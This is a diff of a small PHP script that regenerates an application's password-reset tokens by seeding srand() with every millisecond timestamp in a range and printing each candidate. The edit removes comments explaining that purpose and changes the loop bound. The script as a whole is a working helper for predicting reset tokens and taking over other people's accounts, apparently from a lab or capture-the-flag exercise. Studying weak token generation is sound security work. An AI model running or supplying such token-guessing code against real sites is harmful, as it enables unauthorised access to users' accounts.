@@ -1,6 +1,5 @@
-<?php
-// Reproduces the app's password-reset token for a given seed (millisecond timestamp).
-// The app seeds srand() with round(microtime(true)*1000), so each candidate ms = one seed.
+<?PHP
+
 function generateToken($seed)
 {
     srand($seed);
@@ -12,9 +11,9 @@ function generateToken($seed)
     return $ret;
 }
 
-$ts_lower = (int)$argv[1];
-$ts_upper = (int)$argv[2];
-
-for ($ts = $ts_lower; $ts <= $ts_upper; $ts++) {
+// Generate all possible tokens between lower and upper timestamp
+$ts_lower = $argv[1];
+$ts_upper = $argv[2];
+for ($ts = $ts_lower; $ts < $ts_upper; $ts++) {
     print(generateToken($ts) . "\n");
 }
